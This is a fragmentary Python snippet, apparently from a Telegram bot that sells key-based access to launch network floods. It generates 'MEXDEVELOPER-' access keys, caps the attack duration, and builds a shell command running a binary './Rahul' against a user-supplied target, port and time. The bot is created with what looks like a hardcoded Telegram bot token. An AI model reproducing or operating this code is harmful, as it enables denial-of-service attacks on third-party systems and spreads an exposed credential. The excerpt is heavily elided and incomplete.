...
bot = telebot.TeleBot('7130390464:AAHt1izigF7Z8bFYJPFdUn9dmMpdyE2B7J8')
...
def create_random_key():
    key = "MEXDEVELOPER-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./Rahul {target} {port} {attack_time} 900"  # ✅ Correct variable name
